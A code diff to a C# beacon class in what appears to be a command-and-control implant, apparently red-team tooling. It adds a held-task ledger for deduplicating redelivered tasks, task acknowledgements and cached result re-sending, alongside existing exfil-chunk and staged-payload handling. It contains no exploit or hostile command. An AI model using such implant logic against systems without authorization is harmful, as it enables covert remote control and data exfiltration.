@@ -82,6 +82,13 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // below it.
     private readonly TaskNonceTracker _nonces;
 
+    // The held-task ledger (architecture.md Sec 10.3 -- the dispatch strand),
+    // shared with every other client covering one run: the dedup that keeps a
+    // redelivered task from running twice after a stream died before its ack,
+    // and the result cache another client re-sends when the walk crosses
+    // shapes.
+    private readonly HeldTaskLedger _held;
+
     // Upstream frames waiting for the next POST: task results, exfil chunks,
     // and staged demands produced by earlier responses. Cleared only after a
     // response is processed -- a failed POST re-sends the batch whole, and
@@ -151,7 +158,8 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         TransportProfile? transport = null,
         Cadence? cadence = null,
         string mode = BeaconModes.Poll,
-        bool degradedChannels = false)
+        bool degradedChannels = false,
+        HeldTaskLedger? held = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -171,6 +179,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         _classVerbs = classVerbs;
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
+        _held = held ?? new HeldTaskLedger();
         _seal = transport is { SealsCheckIns: true }
             ? ParseBakedKey(transport.EnvelopeKey)
             : null;
@@ -330,6 +339,13 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         {
             pending = new List<Frame>(_upstream);
         }
+        // The cached results riding this batch (architecture.md Sec 10.3 --
+        // the dispatch strand): everything the ledger holds undelivered was
+        // queued upstream before the snapshot, so a response processed below
+        // means the batch crossed and the marks land. A failed POST throws
+        // before the marking and the entries stay undelivered for the next
+        // cycle (or the stream client the walk hands the run to).
+        var sending = _held.Undelivered();
         var frames = new List<Frame>(1 + pending.Count) { HandshakeFrame() };
         frames.AddRange(pending);
 
@@ -381,6 +397,9 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             return BeaconCycleResult.Terminal;
         }
         _nonces.Negotiated = handshake.ReplayNonces;
+        // The receive-ack arm is per check-in (architecture.md Sec 10.3): the
+        // acks this cycle queues ride the next request body.
+        var acks = handshake.TaskAcks;
         _log.WriteLine($"handshake ok: engagement={handshake.EngagementId}, replay-nonces={handshake.ReplayNonces}");
 
         lock (_upstreamGate)
@@ -388,8 +407,10 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             foreach (var delivered in pending)
                 _upstream.Remove(delivered);
         }
+        foreach (var remembered in sending)
+            _held.MarkDelivered(remembered.TaskId);
         _demands.Clear();
-        ProcessResponse(inbound, demandOrder);
+        ProcessResponse(inbound, demandOrder, acks);
         return BeaconCycleResult.Handshaken;
     }
 
@@ -399,7 +420,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // match the contract is logged and skipped, never thrown, because the
     // batch semantics above make an exception cost the whole accumulated
     // upstream run.
-    private void ProcessResponse(IReadOnlyList<Frame> inbound, IReadOnlyList<string> demandOrder)
+    private void ProcessResponse(IReadOnlyList<Frame> inbound, IReadOnlyList<string> demandOrder, bool acks)
     {
         var index = 1;
 
@@ -436,8 +457,8 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             if (!terminal)
             {
                 _log.WriteLine($"task {demand}: staged chunk run ended without a terminal chunk");
-                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
-                    "staged payload stream ended without a terminal chunk"));
+                QueueResult(task, TaskOutcome.Failed,
+                    "staged payload stream ended without a terminal chunk");
                 continue;
             }
 
@@ -449,7 +470,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
                 offset += part.Length;
             }
             var (outcome, output) = _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
-            AddUpstream(ResultFrame(task, outcome, output));
+            QueueResult(task, outcome, output);
         }
 
         // The tasking half: every remaining frame is a TaskRequest, or --
@@ -474,6 +495,13 @@ internal sealed class EnvelopeBeacon : ICheckInClient
                 _log.WriteLine("response frame was neither a staged chunk nor tasking; skipped");
                 continue;
             }
+
+            // The dispatch strand's ack half (architecture.md Sec 10.3):
+            // delivery evidence for the parsed frame, queued into the next
+            // request body before anything runs. The dedup half lives inside
+            // AcceptTasking, after verification.
+            if (acks)
+                AddUpstream(AckFrame(task.TaskId));
             AcceptTasking(task);
         }
     }
@@ -498,8 +526,8 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             if (_fronted is null || !_fronted.Knows(targetId))
             {
                 _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
-                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"));
+                QueueResult(task, TaskOutcome.Failed,
+                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed");
                 return;
             }
         }
@@ -520,7 +548,32 @@ internal sealed class EnvelopeBeacon : ICheckInClient
                 _ => "task rejected: signature verification failed; not executed",
             };
             _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
-            AddUpstream(ResultFrame(task, TaskOutcome.Failed, cause));
+            _held.Hold(task.TaskId);
+            QueueResult(task, TaskOutcome.Failed, cause);
+            return;
+        }
+
+        // The dispatch strand's dedup half (architecture.md Sec 10.3),
+        // deliberately AFTER verification: the replay defense stays ahead of
+        // the ledger, so a verbatim replay of a held task still falls at the
+        // nonce floor (or the signature) and is refused on the task. A
+        // redelivery that cleared verification re-queues the cached result
+        // unconditionally -- a redelivery implies the server holds no
+        // recorded result, and a duplicate against a completed task is a
+        // no-op there (first-wins). Nothing re-executes.
+        if (_held.Contains(task.TaskId))
+        {
+            if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
+            {
+                QueueResult(task.TaskId, heldOutcome, heldOutput);
+                _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
+            }
+            else
+            {
+                // Held but unfinished (a degraded channel still open, a task
+                // still running): nothing to re-send and nothing to re-run.
+                _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
+            }
             return;
         }
 
@@ -535,10 +588,12 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             if (!_degradedChannels)
             {
                 _log.WriteLine($"task {task.TaskId} refused: no channel on an envelope check-in");
-                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
-                    $"{task.Verb} requires a stream-mode check-in or the degraded-channels bake; this cycle carries neither"));
+                _held.Hold(task.TaskId);
+                QueueResult(task, TaskOutcome.Failed,
+                    $"{task.Verb} requires a stream-mode check-in or the degraded-channels bake; this cycle carries neither");
                 return;
             }
+            _held.Hold(task.TaskId);
             StartPollChannel(task, channelHandler);
             return;
         }
@@ -548,6 +603,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         // run arrives.
         if (task.HasStagedBytes)
         {
+            _held.Hold(task.TaskId);
             _stagedAwaiting[task.TaskId] = task;
             _demands.Add(task.TaskId);
             AddUpstream(new Frame
@@ -558,8 +614,9 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             return;
         }
 
+        _held.Hold(task.TaskId);
         var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
-        AddUpstream(ResultFrame(task, outcome, output));
+        QueueResult(task, outcome, output);
         // Out-of-band exfil chunks follow the TaskResult on the next POST,
         // each carrying the task id so the server reassembles into the
         // artifact store (architecture.md Sec 10.1 exfil, Sec 11).
@@ -584,6 +641,10 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             Version = new ProtocolVersion { Major = 1, Minor = 0 },
             ImplantId = _implantId,
             ReplayNonces = true,
+            // The receive-ack arm (architecture.md Sec 10.3), offered the same
+            // way: an echoing server gets an ack for every parsed task,
+            // queued into the next request body.
+            TaskAcks = true,
         };
         handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
         // The degraded opt-in rides the advertisement: the server's parking
@@ -626,7 +687,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         try
         {
             var (outcome, output) = await handler.Handle(task.Arguments, channel, _channelsGone.Token);
-            AddUpstream(ResultFrame(task, outcome, output));
+            QueueResult(task, outcome, output);
             _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
         }
         catch (OperationCanceledException)
@@ -682,16 +743,41 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     }
 
     private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
+        => ResultFrame(task.TaskId, outcome, output);
+
+    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
         => new()
         {
             Payload = ByteString.CopyFrom(new TaskResult
             {
-                TaskId = task.TaskId,
+                TaskId = taskId,
                 Outcome = outcome,
                 Output = output,
             }.ToByteArray()),
             Kind = FrameKind.TaskResult,
         };
+
+    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
+    // one parsed task, queued into the next request body.
+    private static Frame AckFrame(string taskId)
+        => new()
+        {
+            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
+            Kind = FrameKind.TaskAck,
+        };
+
+    // Queues one task result and caches it in the held-task ledger: the
+    // delivery mark lands only when the cycle carrying the batch completed,
+    // so a dropped POST re-sends through the batch the ledger's re-send
+    // would have covered anyway.
+    private void QueueResult(TaskRequest task, TaskOutcome outcome, string output)
+        => QueueResult(task.TaskId, outcome, output);
+
+    private void QueueResult(string taskId, TaskOutcome outcome, string output)
+    {
+        AddUpstream(ResultFrame(taskId, outcome, output));
+        _held.Remember(taskId, outcome, output);
+    }
 
     // The sealed check-in counter's size in bytes: an 8-byte big-endian
     // integer, the same width the teamserver's floor reads.
